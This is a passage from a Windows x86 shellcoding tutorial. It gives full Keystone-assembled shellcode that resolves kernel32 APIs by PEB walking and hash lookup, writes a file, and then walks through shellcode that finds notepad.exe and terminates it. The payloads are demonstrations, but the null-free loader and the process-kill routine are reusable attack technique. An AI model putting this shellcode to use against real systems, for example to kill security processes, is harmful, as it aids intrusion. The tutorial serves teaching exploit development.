<div align="center"><svg viewBox="0 0 750 110" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1905" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1905"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1905" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1905" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="110" rx="10" fill="url(#bg_s1905)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1905)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1905)" font-weight="bold">Cleanup CloseHandle + TerminateProcess</text>
  <rect x="100" y="50" width="250" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="225" y="66" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">CloseHandle(hFile)</text>
  <text x="225" y="82" text-anchor="middle" fill="#e0e7ff" font-size="10">releases file handle from EBX</text>
  <line x1="350" y1="70" x2="388" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1905)"/>
  <rect x="393" y="50" width="270" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="528" y="66" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">TerminateProcess(-1, 0)</text>
  <text x="528" y="82" text-anchor="middle" fill="#e0e7ff" font-size="10">-1 = current process pseudo-handle</text>
</svg></div>

*Figure 19.c -- Cleanup: CloseHandle releases the file, then TerminateProcess exits using -1 (current process).*

### Complete File I/O Flow

<div align="center"><svg viewBox="0 0 750 170" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1902" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1902"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1902" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1902" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="170" rx="10" fill="url(#bg_s1902)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1902)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1902)" font-weight="bold">File I/O Pipeline</text>

  <rect x="30" y="50" width="120" height="40" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="90" y="66" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Resolve APIs</text>
  <text x="90" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">6 from kernel32</text>
  <line x1="150" y1="70" x2="168" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1902)"/>

  <rect x="173" y="50" width="140" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="243" y="66" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">CreateFileA</text>
  <text x="243" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">"secretremo.txt"</text>
  <line x1="313" y1="70" x2="331" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1902)"/>

  <rect x="336" y="50" width="140" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="406" y="66" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">WriteFile</text>
  <text x="406" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">28-byte message</text>
  <line x1="476" y1="70" x2="494" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1902)"/>

  <rect x="499" y="50" width="110" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="554" y="66" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">CloseHandle</text>
  <text x="554" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">cleanup</text>
  <line x1="609" y1="70" x2="627" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1902)"/>

  <rect x="632" y="50" width="90" height="40" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="677" y="66" text-anchor="middle" fill="#8b949e" font-size="9" font-weight="bold">Terminate</text>
  <text x="677" y="80" text-anchor="middle" fill="#e0e7ff" font-size="8">exit</text>

  <rect x="50" y="110" width="650" height="45" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="130" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Disk Write Artifact</text>
  <text x="375" y="148" text-anchor="middle" fill="#8b949e" font-size="10">"secretremo.txt" ← "Shellcoding With Secret Remo" (28 bytes)</text>
</svg></div>

*Figure 19.2 -- File I/O pipeline. CreateFileA opens the file, WriteFile deposits the payload string, CloseHandle releases the handle, and TerminateProcess exits cleanly.*

### Full Shellcode Source (`filewirte.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0x7c0017a5                ;"  #   CreateFileA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"
    "   push  0xe80a791f                ;"  #   WriteFile
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"
    "   push  0x0ffd97fb                ;"  #   CloseHandle
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"
    "   push  0x78b5b983                ;"  #   TerminateProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"

    " call_createfilea:                  "
    "   xor   ecx, ecx                  ;"
    "   mov   cl,  0x80                 ;"  #   FILE_ATTRIBUTE_NORMAL
    "   xor   edx, edx                  ;"
    "   mov   dl,  0x02                 ;"  #   CREATE_ALWAYS
    "   xor   ebx, ebx                  ;"
    "   mov   bl,  0x03                 ;"
    "   shl   ebx, 30                   ;"  #   0xC0000000 = GENERIC_READ|WRITE
    "   xor   eax, eax                  ;"
    "   mov   ax,  0x7478               ;"  #   "xt"
    "   push  eax                       ;"
    "   push  0x742e6f6d                ;"  #   "mo.t"
    "   push  0x65727465                ;"  #   "etre"
    "   push  0x72636573                ;"  #   "secr"
    "   mov   esi, esp                  ;"  #   ESI → "secretremo.txt"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   hTemplateFile = NULL
    "   push  ecx                       ;"  #   dwFlagsAndAttributes
    "   push  edx                       ;"  #   dwCreationDisposition
    "   push  eax                       ;"  #   lpSecurityAttributes = NULL
    "   push  eax                       ;"  #   dwShareMode = 0
    "   push  ebx                       ;"  #   dwDesiredAccess
    "   push  esi                       ;"  #   lpFileName
    "   call  dword ptr [ebp+0x018]     ;"  #   CreateFileA

    " call_writefile:                    "
    "   mov   ebx, eax                  ;"  #   EBX = hFile
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   bytesWritten on stack
    "   mov   edi, esp                  ;"  #   EDI → &bytesWritten
    "   push  0x6f6d6552                ;"  #   "Remo"
    "   push  0x20746572                ;"  #   "ret "
    "   push  0x63655320                ;"  #   " Sec"
    "   push  0x68746957                ;"  #   "With"
    "   push  0x20676e69                ;"  #   "ing "
    "   push  0x646f636c                ;"  #   "lcod"
    "   push  0x6c656853                ;"  #   "Shel"
    "   mov   esi, esp                  ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   lpOverlapped = NULL
    "   push  edi                       ;"  #   lpNumberOfBytesWritten
    "   push  0x1C                      ;"  #   nNumberOfBytesToWrite = 28
    "   push  esi                       ;"  #   lpBuffer
    "   push  ebx                       ;"  #   hFile
    "   call  dword ptr [ebp+0x1C]      ;"  #   WriteFile

    " call_closehandle:                  "
    "   push   ebx                      ;"  #   hObject = hFile
    "   call   dword ptr [ebp+0x20]     ;"  #   CloseHandle

    " call_terminateprocess:             "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   uExitCode = 0
    "   dec   eax                       ;"  #   EAX = -1
    "   push  eax                       ;"  #   hProcess = -1
    "   call  dword ptr [ebp+0x24]      ;"  #   TerminateProcess(-1, 0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the file write shellcode creating `secretremo.txt` and writing the message:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/file-io-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: File I/O shellcode creating and writing to secretremo.txt*

---


## 20. Process Termination: Killing a Target Process

This shellcode enumerates running processes using the Toolhelp32 API, finds `notepad.exe` by comparing process names, then terminates it with `OpenProcess` and `TerminateProcess`.

### Step 1: Resolving kernel32.dll Functions

Six functions from `kernel32.dll`:

**TerminateProcess** `BOOL TerminateProcess(HANDLE hProcess, UINT uExitCode)` Terminates a process. Hash: `0x78b5b983` → `[ebp+0x10]`

**CreateToolhelp32Snapshot** `HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID)` Takes a snapshot of running processes. Hash: `0xe454dfed` → `[ebp+0x14]`

**Process32First** `BOOL Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)` Retrieves the first process from the snapshot. Hash: `0x3249baa7` → `[ebp+0x18]`

**Process32Next** `BOOL Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)` Retrieves the next process entry. Hash: `0x4776654a` → `[ebp+0x1C]`

**OpenProcess** `HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)` Opens an existing process. Hash: `0xefe297c0` → `[ebp+0x20]`

**CloseHandle** Hash: `0x0ffd97fb` → `[ebp+0x24]`

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983              ; TerminateProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax
    push  0xe454dfed              ; CreateToolhelp32Snapshot
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax
    push  0x3249baa7              ; Process32First
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax
    push  0x4776654a              ; Process32Next
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax
    push  0xefe297c0              ; OpenProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax
    push  0x0ffd97fb              ; CloseHandle
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax
```

<div align="center"><svg viewBox="0 0 750 170" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2003" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2003"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2003" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="170" rx="10" fill="url(#bg_s2003)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2003)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s2003)" font-weight="bold">kernel32.dll API Resolution Process Termination</text>
  <rect x="50" y="48" width="210" height="30" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="155" y="68" text-anchor="middle" fill="#ff3366" font-size="10">TerminateProcess → [ebp+0x10]</text>
  <rect x="270" y="48" width="230" height="30" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="385" y="68" text-anchor="middle" fill="#00d4ff" font-size="10">CreateToolhelp32Snap → [ebp+0x14]</text>
  <rect x="510" y="48" width="200" height="30" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="610" y="68" text-anchor="middle" fill="#ff6b35" font-size="10">Process32First → [ebp+0x18]</text>
  <rect x="50" y="92" width="210" height="30" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="155" y="112" text-anchor="middle" fill="#ff6b35" font-size="10">Process32Next → [ebp+0x1C]</text>
  <rect x="270" y="92" width="210" height="30" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="112" text-anchor="middle" fill="#00ff88" font-size="10">OpenProcess → [ebp+0x20]</text>
  <rect x="490" y="92" width="210" height="30" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="595" y="112" text-anchor="middle" fill="#8b949e" font-size="10">CloseHandle → [ebp+0x24]</text>
  <rect x="50" y="136" width="650" height="22" rx="3" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="152" text-anchor="middle" fill="#8b949e" font-size="9">6 APIs for process enumeration (Toolhelp32), opening, and terminating a target process</text>
</svg></div>

*Figure 20.a -- Six kernel32 APIs resolved: Toolhelp32 for enumeration, OpenProcess for access, TerminateProcess for the kill.*

### Step 2: CreateToolhelp32Snapshot

We take a snapshot of all running processes with `TH32CS_SNAPPROCESS` (0x02):

```nasm
call_createtoolhelp32snapshot:
    xor   eax, eax
    push  eax                     ; th32ProcessID = 0 (all)
    inc   eax
    inc   eax                     ; EAX = 2
    push  eax                     ; dwFlags = TH32CS_SNAPPROCESS
    call  dword ptr [ebp+0x14]   ; CreateToolhelp32Snapshot
    mov   [ebp+0x2C], eax         ; save snapshot handle
```

<div align="center"><svg viewBox="0 0 750 110" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2004" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2004"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2004" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="110" rx="10" fill="url(#bg_s2004)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2004)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s2004)" font-weight="bold">CreateToolhelp32Snapshot</text>
  <rect x="100" y="48" width="250" height="40" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="225" y="65" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">TH32CS_SNAPPROCESS (2)</text>
  <text x="225" y="80" text-anchor="middle" fill="#e0e7ff" font-size="10">inc eax; inc eax (avoids push 2)</text>
  <rect x="400" y="48" width="260" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="530" y="65" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Snapshot Handle</text>
  <text x="530" y="80" text-anchor="middle" fill="#e0e7ff" font-size="10">EAX → [ebp+0x2C]</text>
</svg></div>

*Figure 20.b -- Snapshot all processes. The flag value 2 is built with two `inc eax` instructions to avoid null bytes.*

### Step 3: Allocating PROCESSENTRY32

The `PROCESSENTRY32` struct is 556 bytes (`0x22C`). We allocate it on the stack by pushing zero DWORDs in a loop:

```nasm
set_struct_size:
    xor   eax, eax
    xor   ecx, ecx
    mov   cx, 0x22C               ; 556 bytes

allocate_struct:
    push  eax                     ; push 4 zero bytes
    sub   ecx, 0x04               ; decrease counter
    jnz   allocate_struct         ; loop until done
    mov   edi, esp                ; EDI → PROCESSENTRY32 base

set_req_parameters:
    xor   eax, eax
    mov   ax, 0x22C               ; struct size
    mov   [edi], eax              ; dwSize = 0x22C
```

<div align="center"><svg viewBox="0 0 750 140" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2005" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2005"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2005" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="140" rx="10" fill="url(#bg_s2005)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2005)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s2005)" font-weight="bold">PROCESSENTRY32 Stack Allocation</text>
  <rect x="50" y="48" width="310" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="205" y="64" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Push-Zero Loop (139 iterations)</text>
  <text x="205" y="80" text-anchor="middle" fill="#e0e7ff" font-size="10">556 bytes / 4 = 139 DWORDs of zeroes</text>
  <rect x="380" y="48" width="330" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="545" y="64" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">EDI → PROCESSENTRY32 base</text>
  <text x="545" y="80" text-anchor="middle" fill="#e0e7ff" font-size="10">[edi+0x00] = dwSize = 0x22C (required)</text>
  <rect x="50" y="102" width="660" height="28" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="380" y="121" text-anchor="middle" fill="#8b949e" font-size="10">Struct zeroed on stack, then dwSize set required by Process32First before enumeration</text>
</svg></div>

*Figure 20.c -- PROCESSENTRY32 allocated on the stack. The 556-byte struct is zeroed by pushing DWORDs in a loop, then dwSize is set.*

### Step 4: Process32First Getting the First Entry

```nasm
call_process32first:
    push  edi                     ; lppe → PROCESSENTRY32
    push  [ebp+0x2C]             ; hSnapshot
    call  dword ptr [ebp+0x18]   ; Process32First
```

<div align="center"><svg viewBox="0 0 750 100" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2006" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2006"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2006" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="100" rx="10" fill="url(#bg_s2006)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2006)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s2006)" font-weight="bold">Process32First Begin Enumeration</text>
  <rect x="100" y="48" width="250" height="35" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="225" y="70" text-anchor="middle" fill="#00d4ff" font-size="11">hSnapshot from [ebp+0x2C]</text>
  <rect x="400" y="48" width="260" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="530" y="65" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">EDI → PROCESSENTRY32</text>
  <text x="530" y="80" text-anchor="middle" fill="#8b949e" font-size="9">filled with first process data</text>
</svg></div>

*Figure 20.d -- Process32First populates the PROCESSENTRY32 struct with the first process entry from the snapshot.*

### Step 5: Building the Target Process Name

We construct "notepad.exe" on the stack. The last part `"exe\0"` uses the `shl` trick:

```nasm
create_notepad_string:
    xor   eax, eax
    mov   ax, 0x6578              ; "xe"
    shl   eax, 0x08
    mov   al, 0x65                ; → "exe\0"
    push  eax
    push  0x2e646170              ; "pad."
    push  0x65746f6e              ; "note"
    mov   [ebp+0x30], esp         ; save pointer to "notepad.exe"
```

<div align="center"><svg viewBox="0 0 750 120" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2007" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2007"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2007" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s2007" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="120" rx="10" fill="url(#bg_s2007)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2007)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s2007)" font-weight="bold">Target String: "notepad.exe"</text>
  <rect x="80" y="48" width="160" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="160" y="70" text-anchor="middle" fill="#ff6b35" font-size="11">"note" (0x65746f6e)</text>
  <line x1="240" y1="65" x2="258" y2="65" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2007)"/>
  <rect x="263" y="48" width="160" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="343" y="70" text-anchor="middle" fill="#ff6b35" font-size="11">"pad." (0x2e646170)</text>
  <line x1="423" y1="65" x2="441" y2="65" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s2007)"/>
  <rect x="446" y="48" width="220" height="35" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="556" y="64" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">"exe\0" via shl trick</text>
  <text x="556" y="78" text-anchor="middle" fill="#8b949e" font-size="9">0x6578 << 8 | 0x65</text>
  <rect x="80" y="92" width="586" height="20" rx="3" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="373" y="107" text-anchor="middle" fill="#8b949e" font-size="9">Pointer saved at [ebp+0x30] used for DWORD comparison against szExeFile in the detection loop</text>
</svg></div>

*Figure 20.e -- "notepad.exe" built on the stack from DWORDs. The shl trick constructs "exe\0" without null bytes.*

### Step 6: Detection Loop Finding notepad.exe

The detection loop iterates over process entries. At offset `0x24` in the `PROCESSENTRY32` struct lies `szExeFile` the process name. We compare it DWORD by DWORD against our target:

```nasm
detection_loop:
    xor   ecx, ecx
    ; Compare szExeFile at [edi+0x24] with "notepad.exe"
    mov   eax, [edi+0x24]        ; first 4 bytes of szExeFile
    cmp   eax, 0x65746f6e        ; "note"
    jne   next_process
    mov   eax, [edi+0x28]
    cmp   eax, 0x2e646170        ; "pad."
    jne   next_process
    ; Match found get the PID
    mov   eax, [edi+0x08]        ; th32ProcessID
    jmp   kill_process

next_process:
    push  edi                     ; lppe
    push  [ebp+0x2C]             ; hSnapshot
    call  dword ptr [ebp+0x1C]   ; Process32Next
    test  eax, eax
    jnz   detection_loop
    jmp   call_terminateprocess   ; not found, exit

kill_process:
    ; OpenProcess(PROCESS_TERMINATE, FALSE, pid)
    push  eax                     ; dwProcessId
    xor   ecx, ecx
    push  ecx                     ; bInheritHandle = FALSE
    inc   ecx                     ; PROCESS_TERMINATE = 1
    push  ecx                     ; dwDesiredAccess
    call  dword ptr [ebp+0x20]   ; OpenProcess
    ; TerminateProcess(hProcess, 0)
    xor   ecx, ecx
    push  ecx                     ; uExitCode = 0
    push  eax                     ; hProcess
    call  dword ptr [ebp+0x10]   ; TerminateProcess
```

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2001" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2001"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2001" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s2001" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
